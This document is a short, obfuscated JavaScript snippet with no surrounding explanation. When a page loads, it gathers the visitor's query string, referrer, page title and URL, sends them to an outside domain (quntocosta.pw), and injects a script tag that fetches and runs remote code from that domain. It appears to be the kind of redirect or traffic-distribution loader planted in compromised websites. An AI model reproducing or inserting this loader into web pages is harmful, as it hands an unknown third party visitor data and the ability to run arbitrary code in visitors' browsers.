(function() {
    var name = '_8SfJFFMsGQF8J2Vx';
    if (!window._8SfJFFMsGQF8J2Vx) {
        window._8SfJFFMsGQF8J2Vx = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://quntocosta.pw/shoees',
            P_PATH: 'https://quntocosta.pw/ad89deb/postback',
        };
    }
    const _DJv4y9Zv9P6xZLNV = localStorage.getItem('config');
    if (typeof _DJv4y9Zv9P6xZLNV !== 'undefined' && _DJv4y9Zv9P6xZLNV !== null) {
        var _Jvfd4nvrVCjHbpnf = JSON.parse(_DJv4y9Zv9P6xZLNV);
        var _vG3ZDWHxqdkNT33d = Math.round(+new Date()/1000);
        if (_Jvfd4nvrVCjHbpnf.created_at + window._8SfJFFMsGQF8J2Vx.ttl < _vG3ZDWHxqdkNT33d) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _RZyRGYhqQ9kdX5V9 = localStorage.getItem('subId');
    var _8TkbSHhsB8N1N41P = localStorage.getItem('token');
    var _3kxydb22NvGq8Jkc = '?return=js.client';
        _3kxydb22NvGq8Jkc += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _3kxydb22NvGq8Jkc += '&se_referrer=' + encodeURIComponent(document.referrer);
        _3kxydb22NvGq8Jkc += '&default_keyword=' + encodeURIComponent(document.title);
        _3kxydb22NvGq8Jkc += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _3kxydb22NvGq8Jkc += '&name=' + encodeURIComponent(name);
        _3kxydb22NvGq8Jkc += '&host=' + encodeURIComponent(window._8SfJFFMsGQF8J2Vx.R_PATH);
    if (typeof _RZyRGYhqQ9kdX5V9 !== 'undefined' && _RZyRGYhqQ9kdX5V9 && window._8SfJFFMsGQF8J2Vx.unique) {
        _3kxydb22NvGq8Jkc += '&sub_id=' + encodeURIComponent(_RZyRGYhqQ9kdX5V9);
    }
    if (typeof _8TkbSHhsB8N1N41P !== 'undefined' && _8TkbSHhsB8N1N41P && window._8SfJFFMsGQF8J2Vx.unique) {
        _3kxydb22NvGq8Jkc += '&token=' + encodeURIComponent(_8TkbSHhsB8N1N41P);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._8SfJFFMsGQF8J2Vx.R_PATH + _3kxydb22NvGq8Jkc;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
